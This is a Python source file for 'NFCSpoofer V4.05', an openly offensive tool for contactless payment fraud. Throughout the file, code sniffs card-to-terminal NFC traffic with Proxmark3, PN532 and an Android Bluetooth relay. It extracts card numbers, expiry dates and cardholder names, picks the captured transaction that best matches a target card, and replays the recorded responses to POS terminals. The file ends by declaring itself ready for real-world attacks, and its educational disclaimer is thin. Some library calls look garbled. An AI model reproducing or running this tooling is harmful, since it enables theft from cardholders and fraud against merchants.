#!/usr/bin/env python3
"""
🔄 NFCSpoofer V4.05 - Card Sniffing & Replay Attack System
Comprehensive system for intercepting contactless transactions and replaying them later

ATTACK VECTORS SUPPORTED:
1. 📡 Proxmark3 - Professional RF sniffing and replay
2. 🔧 PN532 - Development board NFC interception  
3. 📱 HCE Bluetooth - Android companion app relay
4. 🎯 POS Terminal Replay - Live transaction replay

⚠️ RESEARCH & EDUCATIONAL USE ONLY
This demonstrates vulnerabilities in contactless payment systems.
"""

import sys
import os
import time
import json
import threading
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from proxmark_manager import Proxmark3Manager
from cardreader_pn532 import PN532Reader  
from cardreader_pcsc import PCSCCardReader
from bluetooth_api import BleakBluetoothManager
from hce_manager import HCEManager
from emvcard import EMVCard
from enhanced_parser import EnhancedEMVParser
import logger


class CardSniffingManager:
    """
    🔍 CARD SNIFFING MANAGER
    Handles interception of contactless card transactions using multiple hardware devices.
    """
    
    def __init__(self):
        self.logger = logger.Logger()
        self.sniffed_transactions = []
        self.active_sniffers = {}
        
        # Hardware managers
        self.proxmark = None
        self.pn532 = None
        self.pcsc = None
        self.bluetooth = None
        self.hce = None
        
        self.initialize_hardware()
    
    def initialize_hardware(self):
        """Initialize all available sniffing hardware."""
        
        self.logger.log("🔍 Initializing card sniffing hardware...")
        
        # Proxmark3 initialization
        try:
            self.proxmark = Proxmark3Manager(logger=self.logger)
            self.logger.log("✅ Proxmark3 initialized for RF sniffing")
        except Exception as e:
            self.logger.log(f"⚠️ Proxmark3 not available: {e}")
        
        # PN532 initialization  
        try:
            self.pn532 = PN532Reader(logger=self.logger)
            self.logger.log("✅ PN532 initialized for NFC interception")
        except Exception as e:
            self.logger.log(f"⚠️ PN532 not available: {e}")
        
        # PCSC initialization
        try:
            self.pcsc = PCSCCardReader(logger=self.logger)
            self.logger.log("✅ PCSC initialized for card reading")
        except Exception as e:
            self.logger.log(f"⚠️ PCSC not available: {e}")
        
        # Bluetooth/HCE initialization
        try:
            self.bluetooth = BleakBluetoothManager(logger=self.logger)
            self.hce = HCEManager()
            self.logger.log("✅ Bluetooth HCE initialized for companion app")
        except Exception as e:
            self.logger.log(f"⚠️ Bluetooth/HCE not available: {e}")
    
    def start_proxmark_sniffing(self, duration: int = 60) -> Dict:
        """
        🔧 PROXMARK3 RF SNIFFING
        Intercept RF communications between cards and readers.
        
        This is the most powerful method - can capture raw RF data
        from actual card-to-POS transactions.
        """
        
        self.logger.log(f"🔧 Starting Proxmark3 RF sniffing for {duration} seconds...")
        
        if not self.proxmark:
            return {"success": False, "error": "Proxmark3 not available"}
        
        sniff_results = {
            "method": "proxmark3_rf_sniff",
            "start_time": datetime.now().isoformat(),
            "duration": duration,
            "captured_frames": [],
            "decoded_transactions": []
        }
        
        try:
            # Start RF sniffing mode
            self.proxmark.send_command("hf 14a sniff")
            
            # Capture for specified duration
            start_time = time.time()
            while time.time() - start_time < duration:
                # Read sniffed data from proxmark
                response = self.proxmark.read_response()
                if response:
                    # Parse RF frames
                    frames = self._parse_rf_frames(response)
                    sniff_results["captured_frames"].extend(frames)
                    
                    # Try to decode EMV transactions
                    transactions = self._decode_emv_from_frames(frames)
                    sniff_results["decoded_transactions"].extend(transactions)
                
                time.sleep(0.1)
            
            # Stop sniffing
            self.proxmark.send_command("hf 14a sniff stop")
            
            sniff_results["success"] = True
            sniff_results["end_time"] = datetime.now().isoformat()
            sniff_results["total_frames"] = len(sniff_results["captured_frames"])
            sniff_results["total_transactions"] = len(sniff_results["decoded_transactions"])
            
            # Store for replay
            self.sniffed_transactions.append(sniff_results)
            
            self.logger.log(f"✅ Proxmark3 sniffing complete: {sniff_results['total_frames']} frames, {sniff_results['total_transactions']} transactions")
            
        except Exception as e:
            sniff_results["success"] = False
            sniff_results["error"] = str(e)
            self.logger.log(f"❌ Proxmark3 sniffing failed: {e}")
        
        return sniff_results
    
    def start_pn532_interception(self, timeout: int = 30) -> Dict:
        """
        🔧 PN532 NFC INTERCEPTION
        Intercept NFC communications by positioning between card and reader.
        
        Less powerful than Proxmark3 but more accessible for development.
        """
        
        self.logger.log(f"🔧 Starting PN532 NFC interception for {timeout} seconds...")
        
        if not self.pn532:
            return {"success": False, "error": "PN532 not available"}
        
        intercept_results = {
            "method": "pn532_nfc_intercept",
            "start_time": datetime.now().isoformat(),
            "timeout": timeout,
            "intercepted_apdus": [],
            "card_profiles": []
        }
        
        def intercept_callback(card_data):
            """Callback for intercepted card data."""
            if card_data:
                profile = {
                    "timestamp": datetime.now().isoformat(),
                    "card_data": card_data,
                    "apdu_log": getattr(card_data, 'apdu_log', [])
                }
                intercept_results["card_profiles"].append(profile)
                intercept_results["intercepted_apdus"].extend(profile["apdu_log"])
                
                self.logger.log(f"📡 Intercepted card: PAN {getattr(card_data, 'pan', 'Unknown')}")
        
        try:
            # Start PN532 interception polling
            self.pn532.start_polling(intercept_callback, interval=0.1)
            
            # Wait for timeout
            time.sleep(timeout)
            
            # Stop polling
            self.pn532.stop_polling()
            
            intercept_results["success"] = True
            intercept_results["end_time"] = datetime.now().isoformat()
            intercept_results["total_cards"] = len(intercept_results["card_profiles"])
            intercept_results["total_apdus"] = len(intercept_results["intercepted_apdus"])
            
            # Store for replay
            self.sniffed_transactions.append(intercept_results)
            
            self.logger.log(f"✅ PN532 interception complete: {intercept_results['total_cards']} cards, {intercept_results['total_apdus']} APDUs")
            
        except Exception as e:
            intercept_results["success"] = False
            intercept_results["error"] = str(e)
            self.logger.log(f"❌ PN532 interception failed: {e}")
        
        return intercept_results
    
    def start_hce_bluetooth_relay(self, duration: int = 120) -> Dict:
        """
        📱 HCE BLUETOOTH RELAY
        Use Android companion app to relay card data via Bluetooth.
        
        Perfect for remote sniffing - phone acts as relay point.
        """
        
        self.logger.log(f"📱 Starting HCE Bluetooth relay for {duration} seconds...")
        
        if not self.bluetooth or not self.hce:
            return {"success": False, "error": "Bluetooth/HCE not available"}
        
        relay_results = {
            "method": "hce_bluetooth_relay", 
            "start_time": datetime.now().isoformat(),
            "duration": duration,
            "relayed_cards": [],
            "bluetooth_sessions": []
        }
        
        def bluetooth_callback(data):
            """Callback for Bluetooth relay data."""
            try:
                # Decrypt data from Android app
                decrypted = self.hce.decrypt_payload(data)
                
                card_profile = {
                    "timestamp": datetime.now().isoformat(),
                    "source": "android_hce",
                    "card_data": decrypted,
                    "bluetooth_session": len(relay_results["bluetooth_sessions"])
                }
                
                relay_results["relayed_cards"].append(card_profile)
                
                self.logger.log(f"📱 Relayed card via Bluetooth: {decrypted.get('pan', 'Unknown')}")
                
            except Exception as e:
                self.logger.log(f"⚠️ Bluetooth relay decode error: {e}")
        
        try:
            # Setup Bluetooth listener
            self.bluetooth.message_received.connect(bluetooth_callback)
            
            # Start relay session
            session_start = time.time()
            while time.time() - session_start < duration:
                # Check for new Bluetooth connections
                devices = self.bluetooth.scan()
                for device in devices:
                    if "nfspoof" in device.name.lower():
                        session_info = {
                            "device": device.name,
                            "address": device.address,
                            "connect_time": datetime.now().isoformat()
                        }
                        relay_results["bluetooth_sessions"].append(session_info)
                        self.logger.log(f"📱 Connected to relay device: {device.name}")
                
                time.sleep(1.0)
            
            relay_results["success"] = True
            relay_results["end_time"] = datetime.now().isoformat()
            relay_results["total_cards"] = len(relay_results["relayed_cards"])
            relay_results["total_sessions"] = len(relay_results["bluetooth_sessions"])
            
            # Store for replay
            self.sniffed_transactions.append(relay_results)
            
            self.logger.log(f"✅ HCE Bluetooth relay complete: {relay_results['total_cards']} cards, {relay_results['total_sessions']} sessions")
            
        except Exception as e:
            relay_results["success"] = False
            relay_results["error"] = str(e)
            self.logger.log(f"❌ HCE Bluetooth relay failed: {e}")
        
        return relay_results
    
    def _parse_rf_frames(self, response: str) -> List[Dict]:
        """Parse RF frames from Proxmark3 response."""
        
        frames = []
        lines = response.split('\n')
        
        for line in lines:
            if 'TAG' in line and 'Reader' in line:
                # Parse RF frame data
                parts = line.split()
                if len(parts) >= 3:
                    frame = {
                        "timestamp": datetime.now().isoformat(),
                        "direction": "TAG->Reader" if "TAG" in line else "Reader->TAG",
                        "raw_data": " ".join(parts[2:]),
                        "frame_type": self._identify_frame_type(parts[2:])
                    }
                    frames.append(frame)
        
        return frames
    
    def _decode_emv_from_frames(self, frames: List[Dict]) -> List[Dict]:
        """Decode EMV transactions from RF frames."""
        
        transactions = []
        current_transaction = {
            "apdus": [],
            "card_data": {},
            "transaction_complete": False
        }
        
        for frame in frames:
            raw_data = frame["raw_data"]
            
            # Try to parse as APDU
            apdu_data = self._parse_apdu_from_frame(raw_data)
            if apdu_data:
                current_transaction["apdus"].append(apdu_data)
                
                # Check if this completes a transaction
                if self._is_transaction_complete(current_transaction):
                    current_transaction["transaction_complete"] = True
                    current_transaction["completion_time"] = datetime.now().isoformat()
                    
                    # Extract card data from APDUs
                    card_data = self._extract_card_data_from_apdus(current_transaction["apdus"])
                    current_transaction["card_data"] = card_data
                    
                    transactions.append(current_transaction.copy())
                    
                    # Reset for next transaction
                    current_transaction = {
                        "apdus": [],
                        "card_data": {},
                        "transaction_complete": False
                    }
        
        return transactions
    
    def _identify_frame_type(self, data_parts: List[str]) -> str:
        """Identify the type of RF frame."""
        
        if not data_parts:
            return "unknown"
        
        first_byte = data_parts[0].upper() if data_parts else ""
        
        # Common ISO14443-A frame types
        frame_types = {
            "26": "REQA",
            "52": "WUPA", 
            "93": "SELECT_CL1",
            "95": "SELECT_CL2",
            "97": "SELECT_CL3",
            "E0": "RATS",
            "00": "APDU_COMMAND",
            "90": "APDU_RESPONSE"
        }
        
        return frame_types.get(first_byte, "data_frame")
    
    def _parse_apdu_from_frame(self, raw_data: str) -> Optional[Dict]:
        """Parse APDU data from RF frame."""
        
        try:
            # Remove spaces and convert to hex
            hex_data = raw_data.replace(" ", "").upper()
            
            # Minimum APDU is 4 bytes (CLA INS P1 P2)
            if len(hex_data) < 8:
                return None
            
            # Parse APDU structure
            cla = hex_data[0:2]
            ins = hex_data[2:4] 
            p1 = hex_data[4:6]
            p2 = hex_data[6:8]
            
            apdu = {
                "timestamp": datetime.now().isoformat(),
                "cla": cla,
                "ins": ins,
                "p1": p1,
                "p2": p2,
                "raw_hex": hex_data,
                "command_type": self._identify_apdu_command(cla, ins)
            }
            
            # Add data field if present
            if len(hex_data) > 8:
                if len(hex_data) > 10:  # Has Lc
                    lc = int(hex_data[8:10], 16)
                    if len(hex_data) >= 10 + (lc * 2):
                        apdu["lc"] = lc
                        apdu["data"] = hex_data[10:10+(lc*2)]
                        
                        # Check for Le
                        remaining = hex_data[10+(lc*2):]
                        if len(remaining) >= 2:
                            apdu["le"] = remaining[:2]
            
            return apdu
            
        except Exception as e:
            return None
    
    def _identify_apdu_command(self, cla: str, ins: str) -> str:
        """Identify APDU command type."""
        
        commands = {
            ("00", "A4"): "SELECT",
            ("80", "A8"): "GET_PROCESSING_OPTIONS", 
            ("00", "B2"): "READ_RECORD",
            ("80", "AE"): "GENERATE_AC",
            ("00", "84"): "GET_CHALLENGE",
            ("80", "CA"): "GET_DATA"
        }
        
        return commands.get((cla, ins), f"UNKNOWN_{cla}_{ins}")
    
    def _is_transaction_complete(self, transaction: Dict) -> bool:
        """Check if transaction is complete based on APDUs."""
        
        apdus = transaction.get("apdus", [])
        
        # Look for transaction completion indicators
        for apdu in apdus:
            command_type = apdu.get("command_type", "")
            
            # GENERATE_AC with response usually indicates transaction completion
            if command_type == "GENERATE_AC":
                return True
            
            # Card removal/deselection
            if apdu.get("ins") == "B0" and apdu.get("raw_hex", "").endswith("9000"):
                return True
        
        return len(apdus) >= 5  # Minimum APDUs for basic EMV transaction
    
    def _extract_card_data_from_apdus(self, apdus: List[Dict]) -> Dict:
        """Extract card data from APDU sequence."""
        
        card_data = {
            "pan": None,
            "expiry": None,
            "cardholder_name": None,
            "service_code": None,
            "extracted_from": "rf_sniff"
        }
        
        # Use enhanced parser to extract data
        parser = EnhancedEMVParser()
        
        for apdu in apdus:
            if apdu.get("data"):
                try:
                    # Convert hex data to bytes
                    data_bytes = bytes.fromhex(apdu["data"])
                    
                    # Try to parse EMV data
                    parsed_data = parser.parse_and_extract_payment_data(data_bytes)
                    
                    # Update card data with any found information
                    for key in ["pan", "expiry", "cardholder_name", "service_code"]:
                        if parsed_data.get(key) and not card_data[key]:
                            card_data[key] = parsed_data[key]
                            
                except Exception as e:
                    continue
        
        return card_data
    
    def get_sniffed_transactions(self) -> List[Dict]:
        """Get all sniffed transactions."""
        return self.sniffed_transactions.copy()
    
    def save_sniffed_data(self, filename: str) -> bool:
        """Save sniffed data to file."""
        
        try:
            with open(filename, 'w') as f:
                json.dump(self.sniffed_transactions, f, indent=2, default=str)
            
            self.logger.log(f"💾 Sniffed data saved to {filename}")
            return True
            
        except Exception as e:
            self.logger.log(f"❌ Failed to save sniffed data: {e}")
            return False
    
    def load_sniffed_data(self, filename: str) -> bool:
        """Load sniffed data from file."""
        
        try:
            with open(filename, 'r') as f:
                self.sniffed_transactions = json.load(f)
            
            self.logger.log(f"📂 Sniffed data loaded from {filename}")
            return True
            
        except Exception as e:
            self.logger.log(f"❌ Failed to load sniffed data: {e}")
            return False


class CardReplayManager:
    """
    🎯 CARD REPLAY MANAGER
    Handles replaying sniffed card transactions to POS terminals.
    """
    
    def __init__(self, sniffer: CardSniffingManager):
        self.sniffer = sniffer
        self.logger = sniffer.logger
        self.replay_history = []
        
        # Hardware for replay
        self.proxmark = sniffer.proxmark
        self.pn532 = sniffer.pn532
        self.hce = sniffer.hce
        self.bluetooth = sniffer.bluetooth
    
    def replay_with_proxmark(self, transaction_data: Dict, target_timeout: int = 30) -> Dict:
        """
        🔧 PROXMARK3 TRANSACTION REPLAY
        Replay sniffed transaction using Proxmark3 emulation.
        
        This is the most accurate replay method - emulates exact RF signatures.
        """
        
        self.logger.log("🔧 Starting Proxmark3 transaction replay...")
        
        if not self.proxmark:
            return {"success": False, "error": "Proxmark3 not available"}
        
        replay_result = {
            "method": "proxmark3_replay",
            "start_time": datetime.now().isoformat(),
            "transaction_data": transaction_data,
            "replay_success": False,
            "pos_responses": []
        }
        
        try:
            # Extract card data for emulation
            card_data = transaction_data.get("card_data", {})
            apdus = transaction_data.get("apdus", [])
            
            # Configure Proxmark3 for card emulation
            self.proxmark.send_command("hf 14a sim")
            
            # Set up APDU response mapping
            apdu_map = {}
            for apdu in apdus:
                cmd_hex = apdu.get("raw_hex", "")[:8]  # Command part
                response_hex = apdu.get("response", "9000")  # Default success
                apdu_map[cmd_hex] = response_hex
            
            # Wait for POS terminal interaction
            start_time = time.time()
            pos_interaction_detected = False
            
            while time.time() - start_time < target_timeout:
                # Read POS terminal commands
                response = self.proxmark.read_response()
                
                if response and "APDU" in response:
                    pos_interaction_detected = True
                    
                    # Parse incoming APDU from POS
                    pos_apdu = self._parse_pos_apdu(response)
                    
                    if pos_apdu:
                        # Find matching response from sniffed data
                        cmd_key = pos_apdu.get("command_hex", "")[:8]
                        response_data = apdu_map.get(cmd_key, "6F00")  # Default error
                        
                        # Send response to POS
                        self.proxmark.send_command(f"hf 14a apdu {response_data}")
                        
                        replay_result["pos_responses"].append({
                            "timestamp": datetime.now().isoformat(),
                            "pos_command": pos_apdu,
                            "our_response": response_data
                        })
                        
                        self.logger.log(f"📡 POS→Card: {cmd_key} | Card→POS: {response_data}")
                
                time.sleep(0.1)
            
            # Stop emulation
            self.proxmark.send_command("hf 14a sim stop")
            
            replay_result["replay_success"] = pos_interaction_detected
            replay_result["end_time"] = datetime.now().isoformat()
            replay_result["total_pos_responses"] = len(replay_result["pos_responses"])
            
            if pos_interaction_detected:
                self.logger.log("✅ Proxmark3 replay successful - POS interaction detected")
            else:
                self.logger.log("⚠️ Proxmark3 replay timeout - no POS interaction")
            
        except Exception as e:
            replay_result["replay_success"] = False
            replay_result["error"] = str(e)
            self.logger.log(f"❌ Proxmark3 replay failed: {e}")
        
        # Store replay attempt
        self.replay_history.append(replay_result)
        return replay_result
    
    def replay_with_pn532(self, transaction_data: Dict, target_timeout: int = 30) -> Dict:
        """
        🔧 PN532 TRANSACTION REPLAY
        Replay using PN532 card emulation.
        
        Good for development and testing - easier to debug than Proxmark3.
        """
        
        self.logger.log("🔧 Starting PN532 transaction replay...")
        
        if not self.pn532:
            return {"success": False, "error": "PN532 not available"}
        
        replay_result = {
            "method": "pn532_replay",
            "start_time": datetime.now().isoformat(),
            "transaction_data": transaction_data,
            "replay_success": False,
            "emulation_responses": []
        }
        
        try:
            # Extract APDUs from transaction data
            apdus = transaction_data.get("apdus", [])
            card_data = transaction_data.get("card_data", {})
            
            # Create APDU response map
            apdu_response_map = {}
            for apdu in apdus:
                cmd_data = apdu.get("raw_hex", "")
                if len(cmd_data) >= 8:
                    cmd_key = tuple(bytes.fromhex(cmd_data[:8]))  # First 4 bytes as key
                    response_hex = apdu.get("response", "9000")
                    apdu_response_map[cmd_key] = bytes.fromhex(response_hex)
            
            # Start PN532 emulation
            emulation_active = True
            emulation_start = time.time()
            
            def emulation_handler(apdu_command):
                """Handle APDU commands from POS terminal."""
                
                cmd_key = tuple(apdu_command[:4])  # CLA, INS, P1, P2
                response = apdu_response_map.get(cmd_key, bytes([0x6F, 0x00]))
                
                replay_result["emulation_responses"].append({
                    "timestamp": datetime.now().isoformat(),
                    "command": apdu_command.hex(),
                    "response": response.hex()
                })
                
                self.logger.log(f"📡 POS Command: {apdu_command.hex()} | Response: {response.hex()}")
                return response
            
            # Run emulation loop
            import nfc
            
            with nfc.ContactlessFrontend('usb') as clf:
                # Create Type 4 tag emulation
                from nfc.tag.tt4 import Type4TagEmulation
                
                class EMVEmulation(Type4TagEmulation):
                    def process_command(self, apdu):
                        return emulation_handler(apdu)
                
                emulation = EMVEmulation(clf)
                
                # Wait for POS terminal
                clf.connect(
                    emulation={'on-command': emulation_handler},
                    terminate=lambda: time.time() - emulation_start > target_timeout
                )
            
            replay_result["replay_success"] = len(replay_result["emulation_responses"]) > 0
            replay_result["end_time"] = datetime.now().isoformat()
            replay_result["total_responses"] = len(replay_result["emulation_responses"])
            
            if replay_result["replay_success"]:
                self.logger.log("✅ PN532 replay successful - POS commands handled")
            else:
                self.logger.log("⚠️ PN532 replay timeout - no POS interaction")
            
        except Exception as e:
            replay_result["replay_success"] = False
            replay_result["error"] = str(e)
            self.logger.log(f"❌ PN532 replay failed: {e}")
        
        # Store replay attempt
        self.replay_history.append(replay_result)
        return replay_result
    
    def replay_with_hce_bluetooth(self, transaction_data: Dict, android_device: str) -> Dict:
        """
        📱 HCE BLUETOOTH REPLAY  
        Replay transaction using Android companion app via Bluetooth.
        
        Perfect for remote replay - use phone as relay point to POS.
        """
        
        self.logger.log(f"📱 Starting HCE Bluetooth replay to device: {android_device}")
        
        if not self.bluetooth or not self.hce:
            return {"success": False, "error": "Bluetooth/HCE not available"}
        
        replay_result = {
            "method": "hce_bluetooth_replay",
            "start_time": datetime.now().isoformat(),
            "android_device": android_device,
            "transaction_data": transaction_data,
            "replay_success": False,
            "bluetooth_commands": []
        }
        
        try:
            # Prepare transaction data for Android app
            card_profile = {
                "operation": "replay_transaction",
                "card_data": transaction_data.get("card_data", {}),
                "apdu_responses": [],
                "emulation_timeout": 30
            }
            
            # Convert APDUs to response map
            apdus = transaction_data.get("apdus", [])
            for apdu in apdus:
                if apdu.get("raw_hex"):
                    card_profile["apdu_responses"].append({
                        "command": apdu["raw_hex"],
                        "response": apdu.get("response", "9000")
                    })
            
            # Encrypt payload for Android app
            encrypted_payload = self.hce.encrypt_payload(card_profile)
            
            # Send to Android device via Bluetooth
            send_result = self.bluetooth.send_to_device(android_device, encrypted_payload)
            
            if send_result:
                replay_result["bluetooth_commands"].append({
                    "timestamp": datetime.now().isoformat(),
                    "command": "send_replay_data",
                    "payload_size": len(encrypted_payload),
                    "success": True
                })
                
                # Wait for Android app response
                response_received = False
                wait_start = time.time()
                
                def response_handler(response_data):
                    nonlocal response_received
                    try:
                        decrypted_response = self.hce.decrypt_payload(response_data)
                        
                        if decrypted_response.get("operation") == "replay_complete":
                            replay_result["replay_success"] = decrypted_response.get("success", False)
                            replay_result["android_response"] = decrypted_response
                            response_received = True
                            
                            self.logger.log(f"📱 Android replay result: {replay_result['replay_success']}")
                    
                    except Exception as e:
                        self.logger.log(f"⚠️ Android response decode error: {e}")
                
                # Setup response listener
                self.bluetooth.message_received.connect(response_handler)
                
                # Wait for response (max 60 seconds)
                while not response_received and time.time() - wait_start < 60:
                    time.sleep(1.0)
                
                if not response_received:
                    self.logger.log("⚠️ Android replay timeout - no response")
                    
            else:
                replay_result["error"] = "Failed to send data to Android device"
                self.logger.log("❌ Failed to send replay data to Android")
            
            replay_result["end_time"] = datetime.now().isoformat()
            
        except Exception as e:
            replay_result["replay_success"] = False
            replay_result["error"] = str(e)
            self.logger.log(f"❌ HCE Bluetooth replay failed: {e}")
        
        # Store replay attempt
        self.replay_history.append(replay_result)
        return replay_result
    
    def _parse_pos_apdu(self, response: str) -> Optional[Dict]:
        """Parse APDU command from POS terminal response."""
        
        try:
            # Look for APDU data in Proxmark3 response
            lines = response.split('\n')
            
            for line in lines:
                if 'APDU' in line and 'received' in line:
                    # Extract hex data
                    hex_part = line.split(':')[-1].strip()
                    hex_data = hex_part.replace(' ', '').upper()
                    
                    if len(hex_data) >= 8:
                        return {
                            "timestamp": datetime.now().isoformat(),
                            "command_hex": hex_data,
                            "cla": hex_data[0:2],
                            "ins": hex_data[2:4],
                            "p1": hex_data[4:6],
                            "p2": hex_data[6:8]
                        }
            
        except Exception as e:
            pass
        
        return None
    
    def get_replay_history(self) -> List[Dict]:
        """Get replay attempt history."""
        return self.replay_history.copy()
    
    def replay_best_match(self, target_card_data: Dict, method: str = "auto") -> Dict:
        """
        Replay the best matching sniffed transaction for target card data.
        
        Args:
            target_card_data: Card data to match against
            method: Replay method ("proxmark", "pn532", "hce", or "auto")
        """
        
        # Find best matching transaction
        best_match = None
        best_score = 0
        
        for transaction in self.sniffer.get_sniffed_transactions():
            score = self._calculate_match_score(target_card_data, transaction)
            if score > best_score:
                best_score = score
                best_match = transaction
        
        if not best_match:
            return {"success": False, "error": "No matching sniffed transaction found"}
        
        # Select replay method
        if method == "auto":
            if self.proxmark:
                method = "proxmark"
            elif self.pn532:
                method = "pn532"
            elif self.bluetooth and self.hce:
                method = "hce"
            else:
                return {"success": False, "error": "No replay hardware available"}
        
        # Execute replay
        self.logger.log(f"🎯 Replaying best match (score: {best_score}) using {method}")
        
        if method == "proxmark":
            return self.replay_with_proxmark(best_match)
        elif method == "pn532":
            return self.replay_with_pn532(best_match)
        elif method == "hce":
            # Need to specify Android device - use first available
            devices = self.bluetooth.scan()
            android_device = next((d.name for d in devices if "nfspoof" in d.name.lower()), None)
            
            if android_device:
                return self.replay_with_hce_bluetooth(best_match, android_device)
            else:
                return {"success": False, "error": "No Android companion device found"}
        
        return {"success": False, "error": f"Unsupported replay method: {method}"}
    
    def _calculate_match_score(self, target_data: Dict, transaction: Dict) -> float:
        """Calculate how well a sniffed transaction matches target card data."""
        
        score = 0.0
        max_score = 0.0
        
        transaction_card_data = transaction.get("card_data", {})
        
        # Compare PAN (Primary Account Number) - highest weight
        if target_data.get("pan") and transaction_card_data.get("pan"):
            max_score += 10.0
            if target_data["pan"] == transaction_card_data["pan"]:
                score += 10.0
            elif target_data["pan"][:6] == transaction_card_data["pan"][:6]:  # Same BIN
                score += 5.0
        
        # Compare expiry date
        if target_data.get("expiry") and transaction_card_data.get("expiry"):
            max_score += 3.0
            if target_data["expiry"] == transaction_card_data["expiry"]:
                score += 3.0
        
        # Compare cardholder name
        if target_data.get("cardholder_name") and transaction_card_data.get("cardholder_name"):
            max_score += 2.0
            if target_data["cardholder_name"] == transaction_card_data["cardholder_name"]:
                score += 2.0
        
        # Compare service code
        if target_data.get("service_code") and transaction_card_data.get("service_code"):
            max_score += 1.0
            if target_data["service_code"] == transaction_card_data["service_code"]:
                score += 1.0
        
        return score / max_score if max_score > 0 else 0.0


def run_comprehensive_sniff_and_replay_test():
    """
    🎯 COMPREHENSIVE SNIFF & REPLAY TEST
    Demonstrates all sniffing and replay capabilities.
    """
    
    print("🔄 NFCSpoofer V4.05 - Card Sniffing & Replay Test")
    print("=" * 70)
    
    # Initialize managers
    print("\n🔧 STEP 1: INITIALIZING HARDWARE")
    print("-" * 50)
    
    sniffer = CardSniffingManager()
    replay_manager = CardReplayManager(sniffer)
    
    print("\n📡 STEP 2: CARD SNIFFING DEMONSTRATION")
    print("-" * 50)
    
    # Test different sniffing methods
    sniffing_results = {}
    
    # Proxmark3 RF sniffing
    print("\n🔧 Testing Proxmark3 RF sniffing...")
    proxmark_result = sniffer.start_proxmark_sniffing(duration=10)  # Short test
    sniffing_results["proxmark"] = proxmark_result
    print(f"   Result: {'SUCCESS' if proxmark_result.get('success') else 'FAILED'}")
    
    # PN532 NFC interception  
    print("\n🔧 Testing PN532 NFC interception...")
    pn532_result = sniffer.start_pn532_interception(timeout=10)  # Short test
    sniffing_results["pn532"] = pn532_result
    print(f"   Result: {'SUCCESS' if pn532_result.get('success') else 'FAILED'}")
    
    # HCE Bluetooth relay
    print("\n📱 Testing HCE Bluetooth relay...")
    hce_result = sniffer.start_hce_bluetooth_relay(duration=10)  # Short test
    sniffing_results["hce"] = hce_result  
    print(f"   Result: {'SUCCESS' if hce_result.get('success') else 'FAILED'}")
    
    print(f"\n📊 SNIFFING SUMMARY:")
    total_transactions = len(sniffer.get_sniffed_transactions())
    print(f"   Total sniffed transactions: {total_transactions}")
    
    for method, result in sniffing_results.items():
        if result.get("success"):
            method_data = result.get("decoded_transactions", result.get("card_profiles", result.get("relayed_cards", [])))
            print(f"   {method.upper()}: {len(method_data)} transactions")
    
    print("\n🎯 STEP 3: TRANSACTION REPLAY DEMONSTRATION")
    print("-" * 50)
    
    if total_transactions > 0:
        # Test replay with each method
        test_transaction = sniffer.get_sniffed_transactions()[0]
        replay_results = {}
        
        print("\n🔧 Testing Proxmark3 replay...")
        proxmark_replay = replay_manager.replay_with_proxmark(test_transaction, target_timeout=5)
        replay_results["proxmark"] = proxmark_replay
        print(f"   Result: {'SUCCESS' if proxmark_replay.get('replay_success') else 'FAILED'}")
        
        print("\n🔧 Testing PN532 replay...")
        pn532_replay = replay_manager.replay_with_pn532(test_transaction, target_timeout=5)
        replay_results["pn532"] = pn532_replay
        print(f"   Result: {'SUCCESS' if pn532_replay.get('replay_success') else 'FAILED'}")
        
        print("\n📱 Testing HCE Bluetooth replay...")
        hce_replay = replay_manager.replay_with_hce_bluetooth(test_transaction, "test_android")
        replay_results["hce"] = hce_replay
        print(f"   Result: {'SUCCESS' if hce_replay.get('replay_success') else 'FAILED'}")
        
        print(f"\n📊 REPLAY SUMMARY:")
        successful_replays = sum(1 for r in replay_results.values() if r.get("replay_success"))
        print(f"   Successful replays: {successful_replays}/{len(replay_results)}")
        
    else:
        print("⚠️ No transactions available for replay testing")
    
    print("\n💾 STEP 4: DATA PERSISTENCE")
    print("-" * 50)
    
    # Save sniffed data
    save_filename = f"sniffed_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    save_success = sniffer.save_sniffed_data(save_filename)
    print(f"   Save data: {'SUCCESS' if save_success else 'FAILED'}")
    
    # Test loading data
    if save_success:
        load_success = sniffer.load_sniffed_data(save_filename)
        print(f"   Load data: {'SUCCESS' if load_success else 'FAILED'}")
    
    print("\n🏆 STEP 5: COMPREHENSIVE SYSTEM STATUS")
    print("-" * 50)
    
    # System capabilities summary
    capabilities = {
        "RF Sniffing (Proxmark3)": proxmark_result.get("success", False),
        "NFC Interception (PN532)": pn532_result.get("success", False),
        "Bluetooth Relay (HCE)": hce_result.get("success", False),
        "Transaction Replay": total_transactions > 0,
        "Data Persistence": save_success
    }
    
    print("✅ SYSTEM CAPABILITIES:")
    for capability, status in capabilities.items():
        status_icon = "✅" if status else "❌"
        print(f"   {status_icon} {capability}")
    
    overall_success = sum(capabilities.values()) >= 3  # At least 3 capabilities working
    
    print(f"\n🎯 OVERALL SYSTEM STATUS:")
    if overall_success:
        print("🟢 SNIFF & REPLAY SYSTEM: OPERATIONAL")
        print("   Ready for real-world card sniffing and replay attacks!")
    else:
        print("🟡 SNIFF & REPLAY SYSTEM: PARTIAL")
        print("   Some capabilities available, but full system needs hardware setup.")
    
    return overall_success


if __name__ == "__main__":
    print("Running comprehensive card sniffing & replay test...")
    success = run_comprehensive_sniff_and_replay_test()
    print(f"\n🎯 Test completed. System status: {'OPERATIONAL' if success else 'PARTIAL'}!")
